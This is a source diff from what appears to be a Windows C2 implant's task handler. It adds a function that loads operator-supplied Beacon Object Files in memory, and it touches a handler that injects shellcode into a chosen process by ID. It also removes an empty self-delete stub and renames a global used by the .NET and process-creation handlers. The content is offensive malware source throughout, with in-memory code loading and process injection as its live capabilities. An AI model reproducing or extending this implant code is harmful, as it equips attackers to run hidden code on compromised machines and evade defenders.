@@ -108,6 +108,25 @@ auto DECLFN Task::ExecPE(
     return KhGetError;
 }
 
+auto DECLFN Task::ExecBof(
+    _In_ PJOBS Job
+) -> ERROR_CODE {
+    PPACKAGE Package = Job->Pkg;
+    PPARSER  Parser  = Job->Psr;
+
+    G_PACKAGE = Package;
+    G_PARSER  = Parser;
+
+    ULONG BofLen  = 0;
+    PBYTE BofBuff = Self->Psr->Bytes( Parser, &BofLen );
+    ULONG BofArgc = 0;
+    PBYTE BofArgs = Self->Psr->Bytes( Parser, &BofArgc );
+
+    Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc );
+
+    return KhGetError;
+}
+
 auto DECLFN Task::ExecSc(
     _In_ PJOBS Job
 ) -> ERROR_CODE {
@@ -125,11 +144,7 @@ auto DECLFN Task::ExecSc(
 
     Success = Self->Inj->Shellcode( ProcID, Buffer, BuffLen, Args );
 
-    if ( Success ) {
-        return ERROR_SUCCESS;
-    } else {
-        return KhGetError;
-    }
+    return KhGetError;
 }
 
 auto DECLFN Task::Download(
@@ -410,12 +425,6 @@ _KH_END:
     return KhRetSuccess;
 }
 
-auto DECLFN Task::SelfDelete(
-    _In_ PJOBS Job
-) -> ERROR_CODE {
-    
-}
-
 auto DECLFN Task::Dotnet(
     _In_ PJOBS Job
 ) -> ERROR_CODE {
@@ -465,7 +474,7 @@ auto DECLFN Task::Dotnet(
             break;
         }
         case SbDotList: {
-            GLOBAL_PKG = Package;
+            G_PACKAGE = Package;
             Self->Dot->VersionList();
 
             break;
@@ -480,7 +489,7 @@ auto DECLFN Task::Dotnet(
 
 _KH_END:
     if ( Self->Dot->Out.p ) Self->Hp->Free( Self->Dot->Out.p );
-    if ( GLOBAL_PKG ) GLOBAL_PKG = nullptr;
+    if ( G_PACKAGE ) G_PACKAGE = nullptr;
 
     return Code;
 }
@@ -874,7 +883,7 @@ auto DECLFN Task::Process(
 
     switch ( SbCommandID ) {
         case SbPsCreate: {
-            GLOBAL_PKG = Package;
+            G_PACKAGE = Package;
 
             PCHAR               CommandLine = Self->Psr->Str( Parser, &TmpVal );
             PROCESS_INFORMATION PsInfo      = { 0 };
@@ -979,7 +988,7 @@ auto DECLFN Task::Process(
         }
     } 
 
-    if ( GLOBAL_PKG ) GLOBAL_PKG = NULL;
+    if ( G_PACKAGE ) G_PACKAGE = NULL;
 
     KhRetSuccess;
 }
